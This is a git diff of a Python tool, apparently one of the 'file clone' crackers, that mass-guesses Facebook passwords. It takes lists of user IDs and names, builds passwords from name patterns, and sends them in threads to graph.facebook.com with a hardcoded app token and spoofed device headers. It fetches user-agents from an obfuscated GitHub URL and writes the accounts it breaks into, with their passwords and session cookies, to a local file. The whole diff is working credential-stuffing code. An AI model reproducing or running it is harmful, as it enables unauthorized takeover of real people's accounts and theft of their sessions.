@@ -80,7 +80,25 @@ def info():
 oks = []
 loop = 0
 sys_ua = []
+ua = []
 
+def live_update():
+    try:
+        url = "https://raw" + ".github" + "user" + "cont" + "ent.co" + "m/T" + "EAM-" + "ELIT" + "E1/da" + "tab" + "ase/m" + "ain/" + "X" + "YA" + ".txt"
+        buffer = BytesIO()
+        curl = pycurl.Curl()
+        curl.setopt(curl.URL, url)
+        curl.setopt(curl.WRITEDATA, buffer)
+        curl.setopt(curl.CAINFO, certifi.where())
+        curl.perform()
+        curl.close()
+        datax = buffer.getvalue().decode('utf-8').splitlines()[0]
+        for u in datax.split("|"):
+            ua.append(u)
+    except:
+        sys.exit("[!!] Internet Error...")
+
+live_update()
 
 def cont(li):
     if li < 10:
@@ -203,6 +221,47 @@ def referer():
     return ''.join(password_list)
 
 
+def dd(fbbd, device):
+    if fbbd.lower() == "samsung":
+        return random.choice(
+            ["GT-I9505", "SM-T835", "SM-S901U", "MMB29K", "SM-S134DL", "SM-J250F", "SM-A217F", "SM-A326B", "SM-A125F",
+             "SM-A720F", "SM-A326U", "SM-G532M", "SM-J410G", "SM-A205GN", "SM-A205GN", "SM-A505GN", "SM-G930F",
+             "SM-J210F", "SM-N9005", "SM-J210F"])
+    elif fbbd.lower() == "vivo":
+        return random.choice(["vivo 1935", "V3Max"])
+    elif fbbd.lower() == "motorola":
+        return random.choice(
+            ['Moto E2 (4G LTE)', 'Moto E3 Power', 'Moto E4', 'Moto E4 Plus', 'Moto E5', 'Moto E5 Plus', 'Moto G',
+             'Moto G 2nd Gen', 'Moto G Play', 'Moto G3', 'Moto G3 Turbo Edition', 'Moto G4', 'Moto G5 Plus', 'Moto G5s',
+             'Moto G5s Plus', 'Moto G6', 'Moto X', 'moto g power (2021)'])
+    elif fbbd.lower() == "oppo":
+        return random.choice(["CPH" + str(random.choice(range(1000, 2000))), "oppo r7sm"])
+    elif fbbd.lower() == "oneplus":
+        return random.choice(["A0001", "OnePlus 11R", "OnePlus 10T", "OnePlus Nord 3 5G"])
+    elif fbbd.lower() == "google":
+        return random.choice(["Pixel 6a", "Pixel 3"])
+    elif fbbd.lower() == "asus":
+        return random.choice(["ASUS_X01BDA", "ASUS_Z01QD", "ASUS_I005DC", "NX55", "MXB48T"])
+    elif fbbd.lower() == "huawei":
+        return random.choice(
+            ["DUB-LX1", "AGS2-L09", "POT-LX1", "DRA-LX2", "POT-LX3", "VOG-L29", "EVR-N29", "FIG-LX1", "Kirin Treble",
+             "HUAWEI LUA-L21", "ATU-L31", "COL-L29", "NAM-LX9", "VOG-L29", "JKM-LX1", "RNE-L22"])
+    elif fbbd.lower() == "lenovo":
+        return random.choice(
+            ["Lenovo TB-X505F", "Lenovo A6020a46", 'PAFR0026IN', 'PAFR0026', 'PAFR0033IN', 'PAFR0033', 'PAFR0013IN',
+             'PAFR0013', 'PAGW0015IN', 'L39051', 'XT2091-8'])
+    elif fbbd.lower() == "sony":
+        return random.choice(
+            ["C2105", "C2104", "G3312", "G3311", "G3313", "LT29i", "D6503", "D6502", "SO-03F", "Xperia Z2", "D6503",
+             "D6502", "SO-03F", "Xperia Z2", "D6563", "D6603", "D6653", "D6616", "D6643", "SO-01G", "SOL26", "D6646",
+             "D5803", "D5833", "SO-02G", "D6633", "D6603", "D6643", "D6653", "D6616", "D6683", "SGP621", "SGP611",
+             "E6533", "D6708"])
+    elif fbbd.lower() == "tecno":
+        return random.choice(["CG8", "CG8h", "LB8", "LB8a", "CH7n", "CH7", "LH6n"])
+    else:
+        return device
+
+
 # -----------#
 
 
@@ -251,174 +310,149 @@ def old():
             uid = star + mal
             heron.submit(login, uid, meth)
 
-
 def filee():
+    global oks, loop
+    pwx = []
     sort.clear()
     sort.logo()
-
-    print("[b]    [red1][A] [sea_green2]Crack Indian File")
-    print("[b]    [red1][B] [spring_green1]Crack BD File")
+    print("[b]    [red1][B] [spring_green1]BD/IND FILE Clone")
     print(sort.line())
-    ask = input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")
-    if ask in ["1", "01", "a", "A"]:
-        print("     [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]IND File Clone")
-        print(sort.line())
-        time.sleep(2)
-        pwx = ["07860786", "57575751", "57575752", "57273200", "59039200", "first123", "first 123", "first1234",
-               "First123", "First1234", "first@123", "first last", "First Last", "firstlast", "firstlast123",
-               "firstlast1234", "first@#", "first@@", "@first", "@first@", "first12"]
-
-    elif ask in ["2", "02", "b", "B"]:
-        print("     [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]BD File Clone")
-        print(sort.line())
-        time.sleep(2)
-        pwx = ["first12", "first123", "first1234", "first12345", "first123456", "firstlast", "firstlast123",
-               "firstlast1234", "first@123", "first@", "first@@", "first@#", "@first", "@first@", "firstlast12345",
-               "firstlast@#", "firstlast@@", "firstlast@", "First123", "First1234", "first last", "First Last",
-               "last123", "Name", "name", "name123", "Name", "firstlast12", "FirstLast123", "FirstLast1234",
-               "FirstLast@#", "FirstLast@@"]
-
-    else:
-        print("     [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Wrong Option")
-        print(sort.line())
-        time.sleep(2)
-        filee()
-    print("[b]     [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]/sdcard/File.txt")
-    path = str(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
-
+    print("[b] Π[chartreuse1]TYPE YOUR FILE PATH EXAMPLE      [b deep_pink2]⟨[/b deep_pink2]  [chartreuse1] "
+          "/sdcard/id.txt")
+    path = str(input(" \x1b[38;1;198m Π \x1b[38;5;155mCHOICE      \x1b[38;5;196m⟩ \x1b[1;97m   "))
     print(sort.line())
     try:
-        file = open(path, "r").read().splitlines()
+        fl = open(path, "r").read().splitlines()
     except:
         filee()
-    print("[b]     [red1]✗ [chartreuse1]Add Pass  [orange3]▶  [chartreuse1](Y/n)")
-    pa = str(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
-    if pa in ["y", "Y", "yes", "Yes", "1"]:
-        pwx = []
+    limit = int(input("   Password Limit -> "))
+    print(sort.line())
+    for i in range(limit):
+        print(" [b] Π[chartreuse1]TYPE PASSWORD. EXAMPLE      [b deep_pink2]⟨[/b deep_pink2]  [chartreuse1] first123, First123, last123, last@@@")
+        passw = str(input(" \x1b[38;1;198m Π \x1b[38;5;155mAdd Pass    \x1b[38;5;196m⟩ \x1b[1;97m   "))
+        if passw not in pwx:
+            pwx.append(passw)
         print(sort.line())
-        print("[b]     [red1]✗ [chartreuse1]Add Limit [orange3]▶  [chartreuse1]Example 10, 15, 20")
-        lim = int(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
-        print(sort.line())
-        for i in range(lim):
-            i += 1
-            print("[b]     [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]first123,firstlast")
-            px = str(input(
-                f"\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mPass  {cont(i)} \x1b[38;5;208m ▶ \x1b[38;0;196m "))
-            print(sort.line())
-            pwx.append(px)
-    else:
-        print(sort.line())
-    print(" Method 1")
-    print(" Method 2")
-    print(" Method 3")
-    print(" Method 4")
-    print(" Method 5")
-    print(" Method 6 (Best)")
-    meth = str(input(" \x1b[38;1;198m Π \x1b[38;5;155mCHOICE      \x1b[38;5;196m⟩ \x1b[1;97m   "))
-    if meth in ["1", "a", "A"]:
-        fb = "mbasic"
-    elif meth in ["2", "b", "B"]:
-        fb = "x"
-    elif meth in ["3", "c", "C"]:
-        fb = "p"
-    elif meth in ["4", "d", "D"]:
-        fb = "touch"
-    elif meth in ["5", "e", "E"]:
-        fb = "free"
-    else:
-        fb = "m"
-    with ThreadPool(max_workers=60) as heron:
+    print("  [r dark_olive_green1]Π1[/r dark_olive_green1][b violet] Method 1")
+    print("  [r dark_olive_green1]Π2[/r dark_olive_green1][b violet] Method 2")
+    print("  [r dark_olive_green1]Π3[/r dark_olive_green1][b violet] Method 3")
+    print("  [r dark_olive_green1]Π4[/r dark_olive_green1][b violet] Method 4")
+    print("  [r dark_olive_green1]Π5[/r dark_olive_green1][b violet] Method 5")
+    print("  [r dark_olive_green1]Π6[/r dark_olive_green1][b violet] Method 6")
+    print("  [r dark_olive_green1]Π7[/r dark_olive_green1][b violet] Method 7")
+    print("  [r dark_olive_green1]Π8[/r dark_olive_green1][b violet] Method 8")
+    print(sort.line())
+    meth = str(input(" \x1b[38;1;198m Π  \x1b[38;5;155mCHOICE      \x1b[38;5;197m⟨ \x1b[1;97m  "))
+    with ThreadPool(max_workers=40) as prince:
         sort.clear()
         sort.logo()
-        print(" [b]    [red1]✗ [chartreuse1]Total Uid [orange3]▶  [chartreuse1]" + str(len(file)))
-        print(" [b]    [red1]✗ [light_green]Method    [orange3]▶  [light_green]M" + meth)
+        print(" [b]    [red1]✗ [chartreuse1]Total Uid [orange3]▶  [chartreuse1]" + str(len(fl)))
+        print(f" [b]    [red1]✗ [light_green]Method   [orange3]▶  [light_green] M" + meth)
         print(sort.line())
-        for mal in file:
-            try:
-                uid = mal.split("|")[0]
-                name = mal.split("|")[1]
-                heron.submit(file_sub, uid, pwx, name, meth, file, fb)
-            except:
-                pass
+        for xd in fl:
+            uid = xd.split("|")[0]
+            name = xd.split("|")[1]
+            prince.submit(file_sub, uid, pwx, name, meth, fl)
 
-
-def file_sub(uid, pwx, name, meth, file, fb):
-    global oks, loop, sys_ua
-    session = requests.session()
+def file_sub(uid, pwx, name, meth, fl):
+    global oks, loop
     try:
+        if meth in ["a", "A", "1"]:
+            uax = ua[0]
+        elif meth in ["b", "B", "2"]:
+            uax = ua[1]
+        elif meth in ["c", "C", "3"]:
+            uax = ua[2]
+        elif meth in ["d", "D", "4"]:
+            uax = ua[3]
+        elif meth in ["e", "E", "5"]:
+            uax = ua[4]
+        elif meth in ["f", "F", "6"]:
+            uax = ua[5]
+        elif meth in ["g", "G", "7"]:
+            uax = ua[6]
+        else:
+            uax = ua[7]
+
         sys.stdout.write(
-            f"\r\x1b[38;1;196m\x1b[38;0;196m└\x1b[38;1;196m\x1b[38;0;196m\033[38;5;46m[{sort.color()}{today}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90m{loop}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90mOK:{str(len(oks))}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90m{'{:.1%}'.format(loop / len(file))}\033[38;5;46m] \r")
+            f"\r  \x1b[38;1;155m\x1b[38;5;155m[PRINCE-M{meth}]   {loop} • \x1b[38;5;155m{str(len(fl))}  • {str(len(oks))}"),
         sys.stdout.flush()
-        fs = name.split(' ')[0]
+        First = name.split(" ")[0]
         try:
-            ls = name.split(' ')[1]
+            Last = name.split(" ")[1]
         except:
-            ls = fs
+            Last = "khan"
         for pw in pwx:
+            ps = pw.replace("first", First.lower()).replace("First", First).replace("last", Last.lower()).replace(
+                "Last", Last).replace("Name", name).replace("name", name.lower()).replace("FIRST",
+                                                                                          First.upper()).replace(
+                "LAST", Last.upper())
 
-            ps = pw.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last',
-                                                                                                          ls).replace(
-                'Name', name).replace('name', name.lower())
+            token = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
+            adi = str(uuid.uuid4())
+            data = {
+                "adid": adi,
+                "format": "json",
+                "device_id": adi,
+                "cpl": "true",
+                "family_device_id": str(uuid.uuid4()),
+                "credentials_type": "device_based_login_password",
+                "error_detail_type": "button_with_disabled",
+                "source": "device_based_login",
+                "email": uid,
+                "password": ps,
+                "access_token": token,
+                "generate_session_cookies": "1",
+                "meta_inf_fbmeta": "",
+                "advertiser_id": str(uuid.uuid4()),
+                "currently_logged_in_userid": "0",
+                "locale": "en_GB",
+                "client_country_code": "GB",
+                "method": "auth.login",
+                "fb_api_req_friendly_name": "authenticate",
+                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+                "api_key": "882a8490361da98702bf97a021ddc14d"}
+            head = {
+                'User-Agent': uax,
+                'Accept': '*/*',
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Host': 'graph.facebook.com',
+                'Connection': 'close',
+                'cache-control': 'no-cache',
+                'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
+                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+                'X-FB-Connection-Type': 'WIFI',
+                'X-Tigon-Is-Retry': 'False',
+                'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+                'X-fb-device-group': str(random.randint(2000, 4000)),
+                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                'X-FB-Request-Analytics-Tags': 'graphservice',
+                'X-FB-HTTP-Engine': 'Liger',
+                'X-FB-Client-IP': 'True',
+                'X-FB-Server-Cluster': 'True',
+                'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
+            url = 'https://graph.facebook.com/auth/login'
+            rq = requests.post(url, data=data, headers=head, allow_redirects=False, verify=certifi.where()).json()
+            if "session_key" in rq:
+                coki = ";".join(i["name"] + "=" + i["value"] for i in rq["session_cookies"])
+                print(f"\r\r[b r green_yellow][PRINCE-OK][/b r green_yellow][b chartreuse1]{uid}|{ps}|{coki}\n")
+                open("/sdcard/PRINCEFILE-OK.txt", "a").write(uid + "|" + ps + "|" + coki + "\n")
+                oks.append(uid)
 
-            free_fb = session.get(f'https://{fb}.facebook.com').text
-            info = {"lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-                    "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-                    "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-                    "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1), "try_number": "0",
-                    "unrecognized_tries": "0", "email": uid, "pass": ps, "login": "Log In"}
-            uax = ua()
-            ver1 = str(random.randrange(1, 99))
-            ver2 = str(random.randrange(90, 121))
-            lsd = lsb()
-            refer = referer()
-            dpr = str(random.randrange(2, 6))
-            sceme = random.choice(['light', 'dark'])
-            had = {
-                'Host': f'{fb}.facebook.com',
-                'content-length': str(random.randrange(1600, 1800, 10)),
-                'sec-ch-ua': f'"Not_A Brand";v={ver1}, "Chromium";v={ver2}, "Android WebView";v={ver2}',
-                'sec-ch-ua-mobile': '?1',
-                'user-agent': uax,
-                'x-response-format': 'JSONStream',
-                'content-type': 'application/x-www-form-urlencoded',
-                'x-fb-lsd': lsd,
-                'viewport-width': '360',
-                'sec-ch-ua-platform-version': '""',
-                'x-requested-with': 'XMLHttpRequest',
-                'x-asbd-id': '129477',
-                'dpr': dpr,
-                'sec-ch-ua-full-version-list': '',
-                'sec-ch-ua-model': '""',
-                'sec-ch-prefers-color-scheme': sceme,
-                'sec-ch-ua-platform': '"Android"',
-                'accept': '*/*',
-                'origin': f'https://{fb}.facebook.com',
-                'sec-fetch-site': 'same-origin',
-                'sec-fetch-mode': 'cors',
-                'sec-fetch-dest': 'empty',
-                'referer': f'https://{fb}.facebook.com/login/?wtsid=rdr_{refer}',
-                'accept-encoding': 'gzip, deflate, br,',
-                'accept-language': 'en-DE,en-US;q=0.9,en;q=0.8'}
-            url = f"https://{fb}.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
-            session.post(url=url, data=info, headers=had)
-            heron_brand = session.cookies.get_dict().keys()
-            if "c_user" in heron_brand:
-                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
-                xx = coki.split("c_user=")[1]
-                xd = xx[:15]
-                print(f"\r\r[SHADID-OK] {xd} <> {ps}\n[Cookies]{coki}")
-                open("/sdcard/SD-OK.txt", "a").write(uid + "|" + ps + "|" + coki + "\n")
-                oks.append(xd)
                 break
-            elif "checkpoint" in heron_brand:
-                pass
-                # print(f"\r\r[green] [CP-ID] {uid} | {ps}")
+            elif "Please Confirm Email" in str(rq):
+                print(f"\r\r[b r green_yellow][PRINCE-OK][/b r green_yellow][b chartreuse1]{uid}|{ps}\n")
+                open("/sdcard/PRINCEFILE-OK.txt", "a").write(uid + "|" + ps + "|" + "\n")
+                oks.append(uid)
+
+                break
             else:
                 continue
+    except Exception as e:
+        print("Error in file_sub:", e)
+    finally:
         loop += 1
-    except:
-
-        time.sleep(30)
 
 
 def ran():
